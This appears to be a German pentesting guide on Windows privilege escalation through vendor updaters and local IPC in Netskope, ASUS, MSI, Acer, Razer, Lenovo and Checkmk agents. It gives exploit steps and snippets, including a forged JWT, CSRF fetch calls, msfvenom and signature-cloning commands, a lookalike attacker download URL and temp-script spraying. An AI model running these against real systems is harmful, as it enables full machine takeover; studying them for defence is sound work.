# Ausnutzen von Enterprise-Auto-Updatern und privilegiertem IPC (z. B. Netskope, ASUS & MSI)

{{#include ../../banners/hacktricks-training.md}}

Diese Seite verallgemeinert eine Klasse von Windows-Local-Privilege-Escalation-Ketten, die bei Enterprise-Endpunktagenten und Updatern gefunden wurden, die eine leicht zugängliche IPC-Schnittstelle und einen privilegierten Update-Ablauf bereitstellen. Ein repräsentatives Beispiel ist Netskope Client für Windows < R129 (CVE-2025-0309): Ein Benutzer mit geringen Berechtigungen kann die Registrierung auf einem vom Angreifer kontrollierten Server erzwingen und anschließend ein bösartiges MSI bereitstellen, das der SYSTEM-Dienst installiert.<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>

Wichtige Ideen, die sich auf ähnliche Produkte übertragen lassen:
- Ein localhost-IPC eines privilegierten Dienstes ausnutzen, um eine erneute Registrierung oder Neukonfiguration auf einem Angreifer-Server zu erzwingen.
- Die Update-Endpunkte des Herstellers implementieren, ein manipuliertes Trusted Root CA bereitstellen und den Updater auf ein bösartiges, „signiertes“ Paket verweisen.
- Schwache Signaturprüfungen (CN-Allow-Listen), optionale Digest-Flags und lax gehandhabte MSI-Eigenschaften umgehen.
- Wenn IPC „verschlüsselt“ ist, den Schlüssel/die IV aus weltweit lesbaren Maschinenkennungen ableiten, die in der Registry gespeichert sind.
- Wenn der IPC-Aufrufer anhand des Image-Pfads/Prozessnamens eingeschränkt wird, in einen zugelassenen Prozess injizieren oder einen solchen Prozess angehalten starten und die DLL über eine minimale Änderung des Thread-Kontexts laden.

Benutzerdefinierte lokale TCP-Dienste verdienen dieselbe Prüfung von Identität und Eingabegrenzen, selbst wenn sie eine PIN oder andere Anwendungszugangsdaten erfordern. Ordne den Listener seinem Prozess und dem effektiven Dienstkonto zu. Prüfe anschließend die exakt bereitgestellte Binärdatei/Version und ob vom Aufrufer kontrollierte Felder längengeprüft werden, bevor sie in Puffer fester Größe kopiert oder zum Erstellen eines Kindprozess-Befehls verwendet werden. [Microsofts Leitfaden zur Vermeidung von Pufferüberläufen](https://learn.microsoft.com/en-us/windows/win32/secbp/avoiding-buffer-overruns) erklärt, warum ungeprüfte externe Eingaben in privilegiertem nativen Code gefährlich sind. Ein Loopback-Listener, hartcodierte Zugangsdaten oder allein ein Prozessname belegen weder eine Speicherbeschädigung noch eine Ausführung als SYSTEM; Erreichbarkeit, Autorisierung, Codepfad und Mitigations bleiben separate Bedingungen. Beschränke routinemäßige Erkundungen auf passive Methoden, statt an einen aktiven Dienst Eingaben mit Crash-Länge zu senden.

---
## 1) Registrierung auf einem Angreifer-Server über localhost-IPC erzwingen

Viele Agenten enthalten einen UI-Prozess im User-Modus, der über localhost-TCP mit JSON mit einem SYSTEM-Dienst kommuniziert.

Bei Netskope beobachtet:
- UI: stAgentUI (niedrige Integrität) ↔ Dienst: stAgentSvc (SYSTEM)
- IPC-Befehls-ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Exploit-Ablauf:
1) Ein JWT-Registrierungstoken erstellen, dessen Claims den Backend-Host steuern (z. B. AddonUrl). alg=None verwenden, sodass keine Signatur erforderlich ist.
2) Die IPC-Nachricht mit dem Registrierungsbefehl sowie JWT und Mandantennamen senden:

```json
{
  "148": {
    "idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
    "tenantName": "TestOrg"
  }
}
```

3) Der service beginnt, deinen rogue server für Enrollment/Config anzusprechen, z. B.:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Hinweise:
- Wenn die Caller-Verifizierung pfad-/namenbasiert ist, sende die Anfrage von einer allow-listed Vendor-Binary aus (siehe §4).<sup>[[1]](#references)[[2]](#references)</sup>

---
## 2) Den Update-Kanal hijacken, um Code als SYSTEM auszuführen

Sobald der Client mit deinem Server kommuniziert, implementiere die erwarteten Endpoints und leite ihn zu einem Angreifer-MSI. Typischer Ablauf:

1) /v2/config/org/clientconfig → Gib eine JSON-Konfiguration mit einem sehr kurzen Updater-Intervall zurück, z. B.:
```json
{
  "clientUpdate": { "updateIntervalInMin": 1 },
  "check_msi_digest": false
}
```
2) /config/ca/cert → Gibt ein PEM-CA-Zertifikat zurück. Der Dienst installiert es im Speicher „Trusted Root“ des lokalen Computers.
3) /v2/checkupdate → Stellt Metadaten bereit, die auf eine bösartige MSI und eine gefälschte Version verweisen.

Umgehung gängiger Prüfungen, die in freier Wildbahn beobachtet wurden:
- Allow-list für Signer-CN: Der Dienst prüft möglicherweise nur, ob der Subject-CN „netSkope Inc“ oder „Netskope, Inc.“ entspricht. Deine rogue CA kann ein Leaf-Zertifikat mit diesem CN ausstellen und damit die MSI signieren.
- CERT_DIGEST-Eigenschaft: Füge eine harmlose MSI-Eigenschaft namens CERT_DIGEST hinzu. Bei der Installation wird sie nicht geprüft.
- Optionale Durchsetzung des Digests: Ein Konfigurations-Flag (z. B. check_msi_digest=false) deaktiviert zusätzliche kryptografische Validierung.

Ergebnis: Der SYSTEM-Dienst installiert deine MSI aus
C:\ProgramData\Netskope\stAgent\data\*.msi
und führt damit beliebigen Code als NT AUTHORITY\SYSTEM aus.<sup>[[1]](#references)[[2]](#references)</sup>

Lehre aus Patch-Umgehungen: Wenn ein Anbieter reagiert, indem er eine kleine Auswahl „vertrauenswürdiger“ Domains auf eine Allow-list setzt, statt die Update-Quelle kryptografisch zu authentifizieren, solltest du nach anbietereigenen Redirectors oder Reverse Proxies suchen, über die sich der Datenverkehr weiterhin lenken lässt. Bei Netskope zeigten öffentliche Folgeuntersuchungen, dass sich eine Allow-list aus der R129-Ära weiterhin über `rproxy.goskope.com` missbrauchen ließ, das von Angreifern kontrollierte Azure App Service-Inhalte proxied. Betrachte Hostname-Allow-lists als Hindernis, nicht als Vertrauensgrenze.<sup>[[14]](#references)</sup>

---
## 3) Verschlüsselte IPC-Anfragen fälschen (falls vorhanden)

Ab R127 verpackte Netskope IPC-JSON in ein encryptData-Feld, das wie Base64 aussieht. Reverse Engineering ergab, dass AES mit einem Schlüssel und IV verwendet wird, die aus Registry-Werten abgeleitet werden, die für jeden Benutzer lesbar sind:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Angreifer können die Verschlüsselung nachbilden und gültige verschlüsselte Befehle von einem Standardbenutzer aus senden.<sup>[[1]](#references)[[2]](#references)</sup> Allgemeiner Tipp: Wenn ein Agent plötzlich seine IPC „verschlüsselt“, suche unter HKLM nach Geräte-IDs, Produkt-GUIDs und Installations-IDs, die als Schlüsselmaterial dienen.

---
## 4) IPC-Allow-lists für Aufrufer umgehen (Pfad-/Namensprüfungen)

Einige Dienste versuchen, den Peer zu authentifizieren, indem sie die PID der TCP-Verbindung ermitteln und den Image-Pfad/-Namen mit einer Allow-list anbietereigener Binärdateien unter Program Files vergleichen (z. B. stagentui.exe, bwansvc.exe, epdlp.exe).

Zwei praktische Umgehungsmöglichkeiten:
- DLL injection in einen auf der Allow-list stehenden Prozess (z. B. nsdiag.exe) und IPC-Weiterleitung von dort aus.
- Eine auf der Allow-list stehende Binärdatei in angehaltenem Zustand starten und deine Proxy-DLL ohne CreateRemoteThread laden (siehe §5), um die vom Treiber durchgesetzten Tamper-Regeln zu erfüllen.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 5) Mit Tamper Protection kompatible Injection: angehaltener Prozess + NtContinue-Patch

Produkte enthalten häufig einen Minifilter-/OB-Callbacks-Treiber (z. B. Stadrv), der gefährliche Rechte aus Handles zu geschützten Prozessen entfernt:
- Prozess: Entfernt PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: Beschränkt auf THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

Ein zuverlässiger User-Mode-Loader, der diese Einschränkungen berücksichtigt:
1) Erstelle mit CreateProcess eine anbietereigene Binärdatei und setze CREATE_SUSPENDED.
2) Beschaffe die noch erlaubten Handles: PROCESS_VM_WRITE | PROCESS_VM_OPERATION für den Prozess und ein Thread-Handle mit THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (oder nur THREAD_RESUME, wenn du den Code an einem bekannten RIP patchst).
3) Überschreibe ntdll!NtContinue (oder einen anderen früh verfügbaren, garantiert gemappten Thunk) mit einem kleinen Stub, der LoadLibraryW mit deinem DLL-Pfad aufruft und anschließend zurückspringt.
4) Rufe ResumeThread auf, um deinen Stub im Prozess auszuführen und deine DLL zu laden.

Da du PROCESS_CREATE_THREAD oder PROCESS_SUSPEND_RESUME nicht für einen bereits geschützten Prozess verwendet hast (du hast ihn selbst erstellt), erfüllt das die Richtlinien des Treibers.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 6) Praktische Tools
- NachoVPN (Netskope-Plugin) automatisiert eine rogue CA, das Signieren bösartiger MSI-Dateien und stellt die benötigten Endpunkte bereit: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.<sup>[[3]](#references)</sup>
- UpSkope ist ein benutzerdefinierter IPC-Client, der beliebige (optional AES-verschlüsselte) IPC-Nachrichten erstellt und die Injection in angehaltene Prozesse enthält, um Nachrichten von einer auf der Allow-list stehenden Binärdatei aus zu senden.<sup>[[4]](#references)</sup>

## 7) Schneller Triage-Ablauf für unbekannte Updater-/IPC-Angriffsflächen

Wenn du es mit einem neuen Endpoint-Agent oder einer „Helper“-Suite eines Motherboard-Herstellers zu tun hast, reicht ein kurzer Ablauf meist aus, um festzustellen, ob sich ein vielversprechendes Privesc-Ziel bietet:<sup>[[6]](#references)</sup>

1) Ermittle Loopback-Listener und ordne sie den Prozessen des Anbieters zu:

```powershell
Get-NetTCPConnection -State Listen |
  Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
  Select-Object LocalAddress,LocalPort,OwningProcess,
    @{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```

2) Mögliche Named Pipes auflisten:

```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```

3) Registry-gestützte Routing-Daten von pluginbasierten IPC-Servern auslesen:

```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
  Select-Object PSChildName
```

4) Extrahiere zuerst Endpoint-Namen, JSON-Schlüssel und Command-IDs aus dem User-Mode-Client. Gepackte Electron/.NET-Frontends leaken häufig das vollständige Schema:

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
  -Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```

5) Suche nach dem tatsächlichen Vertrauensprädikat, nicht nur nach dem Codepfad, der letztlich den Prozess startet:

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
  -Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```

Muster, die Priorität verdienen:
- `CryptQueryObject`/certificate parsing ohne `WinVerifyTrust` bedeutet meist, dass „Zertifikat vorhanden“ mit „Zertifikat vertrauenswürdig“ gleichgesetzt wurde. Das ermöglicht das Klonen von Zertifikaten oder andere Tricks mit gefälschten Signaturen.
- Substring-/Suffix-Prüfungen für `Origin`, `Referer`, Download-URLs, Prozessnamen oder Signer-CNs sind keine Authentifizierung. `contains(".vendor.com")` ist meist mit vom Angreifer kontrollierten Lookalike-Domains ausnutzbar.
- Wenn die GUI mit niedrigen Privilegien entscheidet, „die Datei ist vertrauenswürdig“, und der SYSTEM-Broker dieses Ergebnis lediglich übernimmt, lässt sich die Sicherheitsgrenze oft vollständig umgehen, indem man die clientseitige DLL/JS patcht oder neu implementiert (Validierungssplit nach Razer-Art).
- Wenn der Broker ein Payload nach `%TEMP%`/`C:\Windows\Temp` kopiert und es anschließend von dort aus validiert oder einplant, prüfe sofort auf TOCTOU-Austauschfenster und auf benachbarte Plugin-Module, die alternative `ExecuteTask()`-Wrapper mit schwächeren Prüfungen bereitstellen.<sup>[[6]](#references)</sup>

Bei Zielen mit vielen Named Pipes ist PipeViewer eine schnelle Möglichkeit, schwache DACLs und aus der Ferne erreichbare Pipes zu finden, bevor du mit der detaillierten Analyse des Protokolls beginnst.<sup>[[11]](#references)</sup>

Wenn das Ziel Aufrufer nur anhand von PID, Image-Pfad oder Prozessnamen authentifiziert, betrachte das eher als Hürde denn als Sicherheitsgrenze: Eine Injection in den legitimen Client oder eine Verbindung über einen zugelassenen Prozess reicht oft aus, um die Prüfungen des Servers zu erfüllen. Für Named Pipes behandelt [diese Seite zu Client-Impersonation und Pipe-Missbrauch](named-pipe-client-impersonation.md) das Primitive ausführlicher.

Untersuche bei einem privilegierten **Bereinigungs- oder Wiederherstellungsbroker** neben der Pipe-ACL auch die Vertrauensgrenze für Pfade. Ein Aufrufer mit niedrigeren Privilegien kann möglicherweise ein Wiederherstellungsziel auswählen oder ein bereitgestelltes Backup-Artefakt in einem gemeinsam genutzten Verzeichnis umbenennen, selbst wenn die Dienst-Executable und ihr Installationsverzeichnis geschützt sind. Prüfe separat, ob der Aufrufer den Wiederherstellungsbefehl aufrufen und die genaue bereitgestellte Eingabe oder den Dateinamen ändern kann, ob der Broker mit einer höheren Identität läuft und ob der Wiederherstellungsvorgang tatsächlich in den ausgewählten geschützten Pfad schreibt. Ein beschreibbares Bereitstellungsverzeichnis oder eine lesbare Pipe allein belegt keinen beliebigen privilegierten Schreibzugriff; die Zielzuordnung und das Dienstverhalten müssen durch Code-Review oder kontrollierte Tests geprüft werden. Führe bei passiver Aufklärung keine unbekannten Bereinigungsbefehle aus, da sie Benutzerdateien löschen könnten.

---
## 8) Modulare Add-in-Broker, die nur anhand von Hersteller-Signaturen authentifiziert werden (Lenovo-Vantage-Muster)

Eine neuere Variante, nach der es sich zu suchen lohnt, ist der **signed-client RPC broker**: Ein Lenovo-signierter Desktop-Prozess mit niedrigen Privilegien kommuniziert mit einem SYSTEM-Dienst, und der Dienst leitet JSON-Befehle an eine Gruppe von XML-beschriebenen Add-ins unter `%ProgramData%` weiter. Sobald Codeausführung **innerhalb eines beliebigen akzeptierten, signierten Clients** erreicht ist, gehört jeder Vertrag mit `runas="system"` zu deiner Angriffsfläche.<sup>[[15]](#references)</sup>

Wichtige Primitive aus der Lenovo-Vantage-Forschung:
- **Dem Aufrufer vertrauen, weil er vom Hersteller signiert ist**: Forschende erreichten einen authentifizierten Kontext, indem sie eine Lenovo-signierte EXE in ein beschreibbares Verzeichnis kopierten und einen DLL-Side-Load (`profapi.dll`) auslösten, sodass beliebiger Code innerhalb eines Clients ausgeführt wurde, dem der Dienst bereits vertraute.
- **Ermittlung der Angriffsfläche anhand von Manifesten**: Add-ins sind unter `C:\ProgramData\Lenovo\Vantage\Addins\*.xml` deklariert; mehrere Verträge laufen als `SYSTEM`. Daher offenbart das Auflisten dieser Manifeste oft schneller die tatsächlich privilegierten Verben als das Reverse Engineering des Brokers selbst.
- **Fehler einzelner Befehle hinter dem authentifizierten Kanal**: Nachdem Forschende in den vertrauenswürdigen Client gelangt waren, fand öffentliche Forschung Path-Traversal plus Race Conditions in Update-/Installationsverben, den Missbrauch von Raw SQL in privilegierten Einstellungsdatenbanken und substring-basierte Prüfungen von Registry-Pfaden, die Schreibzugriffe außerhalb des vorgesehenen Hives ermöglichten.

Nützliche Aufklärung auf einem Ziel:

```powershell
Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
  Select-String -Pattern 'runas="system"|<name>|<namespace>'
```

```powershell
Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
  -Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
```

Praktische Erkenntnis: Wenn eine Helper-Suite einen Broker bereitstellt, der zuerst den **aufrufenden Prozess** authentifiziert und erst dann Dutzende Plugin-/Add-in-Befehle ausführt, sollte man nicht nach dem Umgehen der Vertrauensprüfung am Eingang aufhören. Dumpen Sie die Manifest-/Vertragstabelle und fuzz-en Sie jeden Befehl mit hohen Berechtigungen unabhängig; der authentifizierte Kanal verbirgt gewöhnlich mehrere Fehler in einer zweiten Phase.

---
## 1) CSRF vom Browser auf localhost gegen privilegierte HTTP-APIs (ASUS DriverHub)

DriverHub wird mit einem HTTP-Dienst im User-Modus (ADU.exe) auf 127.0.0.1:53000 ausgeliefert, der Browser-Aufrufe von https://driverhub.asus.com erwartet. Der Origin-Filter führt einfach `string_contains(".asus.com")` über den Origin-Header und über Download-URLs aus, die unter `/asus/v1.0/*` verfügbar sind. Daher besteht jede vom Angreifer kontrollierte Host-Adresse wie `https://driverhub.asus.com.attacker.tld` die Prüfung und kann über JavaScript zustandsverändernde Requests ausführen.<sup>[[6]](#references)</sup> Weitere Umgehungsmuster finden Sie unter [CSRF-Grundlagen](../../pentesting-web/csrf-cross-site-request-forgery.md).

Praktischer Ablauf:
1) Registrieren Sie eine Domain, die `.asus.com` enthält, und hosten Sie dort eine bösartige Webseite.
2) Verwenden Sie `fetch` oder XHR, um einen privilegierten Endpunkt (z. B. `Reboot`, `UpdateApp`) unter `http://127.0.0.1:53000` aufzurufen.
3) Senden Sie den JSON-Body, den der Handler erwartet – das gepackte Frontend-JS zeigt das folgende Schema.

```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```

Sogar die unten gezeigte PowerShell-CLI funktioniert, wenn der Origin-Header auf den vertrauenswürdigen Wert gefälscht wird:

```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
  -Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
  -Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```

Jeder Browseraufruf der Angreifer-Website wird somit zu einem lokalen CSRF mit einem Klick (oder mit `onload` ganz ohne Klick), der einen SYSTEM-Hilfsprozess steuert.

---
## 2) Unsichere Code-Signaturprüfung & Zertifikatsklonen (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` lädt beliebige, im JSON-Body angegebene ausführbare Dateien herunter und speichert sie im Cache unter `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. Die Download-URL wird mit derselben Teilstring-Logik validiert, sodass `http://updates.asus.com.attacker.tld:8000/payload.exe` akzeptiert wird. Nach dem Download prüft ADU.exe lediglich, ob die PE-Datei eine Signatur enthält und ob der Subject-String ASUS entspricht – keine `WinVerifyTrust`-Prüfung, keine Zertifikatskettenvalidierung.

So lässt sich der Ablauf missbrauchen:
1) Eine Payload erstellen (z. B. `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) ASUＳ’ Signatur auf die Payload klonen (z. B. `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) `pwn.exe` auf einer ähnlich aussehenden `.asus.com`-Domain hosten und UpdateApp über den obigen Browser-CSRF auslösen.

Da sowohl die Origin- als auch die URL-Filter auf Teilstrings basieren und die Signaturprüfung nur Strings vergleicht, lädt DriverHub die Binärdatei des Angreifers herunter und führt sie mit erhöhten Rechten aus.<sup>[[6]](#references)</sup>

---
## 1) TOCTOU in den Kopier-/Ausführungspfaden des Updaters (MSI Center CMD_AutoUpdateSDK)

Der SYSTEM-Dienst von MSI Center stellt ein TCP-Protokoll bereit, bei dem jeder Frame aus `4-byte ComponentID || 8-byte CommandID || ASCII arguments` besteht. Die Kernkomponente (Component ID `0f 27 00 00`) enthält `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Der Handler:
1) Kopiert die angegebene ausführbare Datei nach `C:\Windows\Temp\MSI Center SDK.exe`.
2) Prüft die Signatur über `CS_CommonAPI.EX_CA::Verify` (der Subject des Zertifikats muss „MICRO-STAR INTERNATIONAL CO., LTD.“ entsprechen und `WinVerifyTrust` erfolgreich sein).
3) Erstellt eine geplante Aufgabe, die die temporäre Datei mit vom Angreifer kontrollierten Argumenten als SYSTEM ausführt.

Zwischen der Prüfung und `ExecuteTask()` wird die kopierte Datei nicht gesperrt. Ein Angreifer kann:
- Frame A senden, der auf eine legitime, von MSI signierte Binärdatei verweist (damit die Signaturprüfung besteht und die Aufgabe eingeplant wird).
- Dies mit wiederholten Frame-B-Nachrichten überrennen, die auf eine bösartige Payload verweisen und `MSI Center SDK.exe` direkt nach Abschluss der Prüfung überschreiben.

Wenn der Task Scheduler die Aufgabe ausführt, startet er die überschriebene Payload als SYSTEM, obwohl die ursprüngliche Datei geprüft wurde. Für eine zuverlässige Ausnutzung werden zwei Goroutines/Threads verwendet, die `CMD_AutoUpdateSDK` so lange wiederholt senden, bis das TOCTOU-Fenster getroffen wird.<sup>[[6]](#references)</sup>

---
## 2) Missbrauch benutzerdefinierter IPC auf SYSTEM-Ebene & Impersonation (MSI Center + Acer Control Centre)

### MSI Center-TCP-Befehlssätze
- Jedes von `MSI.CentralServer.exe` geladene Plugin/jede DLL erhält eine Component ID, die unter `HKLM\SOFTWARE\MSI\MSI_CentralServer` gespeichert ist. Die ersten 4 Bytes eines Frames wählen die Komponente aus und ermöglichen Angreifern so, Befehle an beliebige Module weiterzuleiten.
- Plugins können eigene Task Runner definieren. `Support\API_Support.dll` stellt `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` bereit und ruft direkt `API_Support.EX_Task::ExecuteTask()` auf – **ohne Signaturprüfung**. Jeder lokale Benutzer kann den Befehl auf `C:\Users\<user>\Desktop\payload.exe` richten und so zuverlässig SYSTEM-Codeausführung erreichen.
- Das Mitschneiden des Loopback-Verkehrs mit Wireshark oder das Untersuchen der .NET-Binärdateien mit dnSpy macht die Zuordnung zwischen Component und Befehl schnell sichtbar; benutzerdefinierte Go-/Python-Clients können die Frames anschließend wiederholen.<sup>[[6]](#references)</sup>

### Benannte Acer Control Centre-Pipes & Impersonation-Level
- `ACCSvc.exe` (SYSTEM) stellt `\\.\pipe\treadstone_service_LightMode` bereit. Die Discretionary ACL erlaubt Remote-Clients (z. B. `\\TARGET\pipe\treadstone_service_LightMode`). Das Senden der Befehls-ID `7` mit einem Dateipfad ruft die Prozessstart-Routine des Dienstes auf.
- Die Client-Bibliothek serialisiert zusammen mit den Argumenten ein abschließendes Magic-Byte (113). Dynamische Instrumentierung mit Frida/`TsDotNetLib` (siehe [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) für Instrumentierungstipps) zeigt, dass der native Handler diesen Wert vor dem Aufruf von `CreateProcessAsUser` einem `SECURITY_IMPERSONATION_LEVEL` und einer Integrity SID zuordnet.
- Wird 113 (`0x71`) durch 114 (`0x72`) ersetzt, landet der Aufruf im allgemeinen Zweig, der das vollständige SYSTEM-Token beibehält und eine High-Integrity-SID (`S-1-16-12288`) setzt. Die gestartete Binärdatei läuft daher uneingeschränkt als SYSTEM, sowohl lokal als auch rechnerübergreifend.
- In Kombination mit dem offengelegten Installer-Flag (`Setup.exe -nocheck`) lässt sich ACC sogar auf Labor-VMs installieren und die Pipe ohne Herstellerhardware testen.<sup>[[6]](#references)</sup>

Diese IPC-Schwachstellen zeigen, warum Localhost-Dienste eine gegenseitige Authentifizierung erzwingen müssen (ALPC-SIDs, Filter für `ImpersonationLevel=Impersonation`, Token-Filterung) und warum die Hilfsfunktionen zum „Ausführen beliebiger Binärdateien“ aller Module dieselben Signaturprüfungen verwenden müssen.

---
## 3) COM/IPC-„Elevator“-Hilfsprozesse mit schwacher Validierung im User Mode (Razer Synapse 4)

Razer Synapse 4 ergänzt ein weiteres nützliches Muster dieser Schwachstellenfamilie: Ein Benutzer mit niedrigen Rechten kann einen COM-Hilfsprozess auffordern, über `RzUtility.Elevator` einen Prozess zu starten. Die Vertrauensentscheidung wird dabei an eine User-Mode-DLL (`simple_service.dll`) delegiert, statt innerhalb der privilegierten Grenze robust durchgesetzt zu werden.

Beobachteter Ausnutzungspfad:
- Das COM-Objekt `RzUtility.Elevator` instanziieren.
- `LaunchProcessNoWait(<path>, "", 1)` aufrufen, um einen Start mit erhöhten Rechten anzufordern.
- Im öffentlichen PoC wird die PE-Signaturprüfung in `simple_service.dll` vor der Anforderung deaktiviert, sodass eine beliebige, vom Angreifer ausgewählte ausführbare Datei gestartet werden kann.<sup>[[6]](#references)[[10]](#references)</sup>

Minimale PowerShell-Aufrufsyntax:

```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```

Allgemeine Erkenntnis: Untersuchen Sie beim Reverse Engineering von „Helper“-Suiten nicht nur localhost-TCP oder Named Pipes. Prüfen Sie, ob es COM-Klassen mit Namen wie `Elevator`, `Launcher`, `Updater` oder `Utility` gibt, und verifizieren Sie anschließend, ob der privilegierte Dienst die Ziel-Binärdatei tatsächlich selbst überprüft oder lediglich einem Ergebnis vertraut, das von einer patchbaren User-Mode-Client-DLL berechnet wurde. Dieses Muster tritt nicht nur bei Razer auf: Jedes geteilte Design, bei dem der Broker mit hohen Privilegien eine Allow/Deny-Entscheidung von der Seite mit niedrigen Privilegien übernimmt, ist ein potenzieller Angriffsvektor für privesc.


---
## Vorhersehbare Ausführung temporärer Skripte während einer MSI-Reparatur (Checkmk Agent / CVE-2024-0670)

Einige Windows-Agents führen privilegierte Aktionen noch immer aus, indem sie eine temporäre `.cmd`-Datei in `C:\Windows\Temp` schreiben und als `SYSTEM` ausführen. Ist der Dateiname vorhersehbar und erstellt der Dienst vorhandene Dateien nicht sicher neu, kann ein Benutzer mit niedrigen Privilegien die künftige temporäre Datei vorab als **schreibgeschützt** anlegen und den privilegierten Prozess dazu bringen, vom Angreifer kontrollierte Inhalte statt seines eigenen Skripts auszuführen.

Beobachtet in anfälligen Checkmk-Agent-Builds:
- Temp-Muster: `cmk_all_<PID>_1.cmd`
- Betroffene Branches: `2.0.0`, `2.1.0`, `2.2.0`
- Auslöser: MSI-**Reparatur** des zwischengespeicherten Agent-Pakets<sup>[[8]](#references)[[9]](#references)</sup>

Praktischer Ablauf:
1. Schätzen Sie anhand der aktuellen Prozess-IDs oder der PID des laufenden Agents einen realistischen PID-Bereich.
2. Schreiben Sie eine kurze `.cmd`-Payload in **ASCII** (`Set-Content -Encoding Ascii` oder Umleitung über `cmd.exe`; vermeiden Sie PowerShell-Ausgaben in UTF-16 für Batch-Dateien).
3. Verteilen Sie `C:\Windows\Temp\cmk_all_<PID>_1.cmd` über den möglichen Bereich und markieren Sie jede Datei als schreibgeschützt.
4. Lösen Sie eine Reparatur der zwischengespeicherten MSI aus, damit der privilegierte Dienst versucht, das temporäre Skript neu zu erstellen und anschließend auszuführen.<sup>[[7]](#references)</sup>

```powershell
Set-Content -Path C:\ProgramData\payload.cmd -Encoding Ascii -Value "@echo off`nwhoami > C:\ProgramData\proof.txt"
1..10000 | ForEach-Object {
  Copy-Item C:\ProgramData\payload.cmd "C:\Windows\Temp\cmk_all_${_}_1.cmd"
  Set-ItemProperty "C:\Windows\Temp\cmk_all_${_}_1.cmd" -Name IsReadOnly -Value $true
}
```

Wenn das anfällige Produkt mit Windows Installer installiert wurde, ordne die zufällig aussehende zwischengespeicherte MSI unter `C:\Windows\Installer` ihrem Produktnamen zu, bevor du die Reparatur auslöst:<sup>[[7]](#references)</sup>

```powershell
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties" |
  ForEach-Object {
    $p = Get-ItemProperty $_.PSPath
    [PSCustomObject]@{Name=$p.DisplayName; Pkg=$p.LocalPackage}
  } | Where-Object Name -like "*Check MK Agent*"

msiexec /fa C:\Windows\Installer\<cached-agent>.msi
```

Betriebshinweise:
- `qwinsta` ist nützlich, wenn `msiexec /fa` in einer nicht-interaktiven WinRM-Shell fehlschlägt und du herausfinden musst, ob eine bestehende Desktop-/getrennte Sitzung die Reparatur korrekt auslösen kann.<sup>[[7]](#references)</sup>
- Dieses Muster lässt sich auf andere Endpoint-Agents und Updater übertragen, die **temporäre Skripte an allgemein beschreibbaren Speicherorten ablegen und später als SYSTEM ausführen**. Prüfe auf vorhersehbare Namen, fehlende Semantik für exklusives Erstellen und Reparatur-/Update-Abläufe, die bei Bedarf ausgelöst werden können.

### Interaktive Installer-Reparatur und privilegierte Konsole

PDF24 Creator 11.15.1 veranschaulicht ein separates MSI-Reparaturrisiko: Seine benutzerdefinierte Druckerinstallationsaktion kann während der Reparatur eine sichtbare Konsole mit SYSTEM-Rechten starten. Der Hersteller änderte den MSI-Installer in Version 11.15.2, um dieses Verhalten zu beheben. Eine ältere Produktversion ist lediglich ein Hinweis für die Triage. Prüfe das registrierte oder erreichbare MSI-Paket, ob dieser Benutzer eine Reparatur starten kann, ob die anfällige benutzerdefinierte Aktion und die Verzögerung durch die Protokolldatei vorhanden sind und ob ein interaktiver Desktop die Konsole sichtbar machen kann. Die gemeldete Verzögerung nutzte ein Oplock auf `faxPrnInst.log`; gewöhnliche Schreibrechte auf die Datei sind nicht die einzige Zugriffsvoraussetzung. Eine nicht-interaktive Shell, ein nicht zugängliches Paket oder ein gepatchter Installer können die Angriffskette unterbrechen. Dieses Problem hängt nicht von `AlwaysInstallElevated` ab und unterscheidet sich vom Ersetzen eines vorhersehbar benannten temporären Skripts.

---
